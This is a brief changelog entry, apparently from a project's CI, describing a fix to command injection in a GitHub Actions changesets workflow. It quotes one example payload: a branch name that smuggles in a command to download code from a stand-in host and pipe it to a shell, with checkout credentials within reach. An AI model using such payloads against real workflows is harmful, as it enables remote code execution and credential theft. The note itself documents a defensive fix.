---
---

The changesets workflow no longer interpolates `github.head_ref` / `github.base_ref` straight into shell. A branch name such as `x$(curl${IFS}evil|sh)` is a valid git ref, and the step runs with the `PROSOPONATOR_PAT` checkout credentials in `.git/config`; the refs now reach the script through environment variables and are quoted.
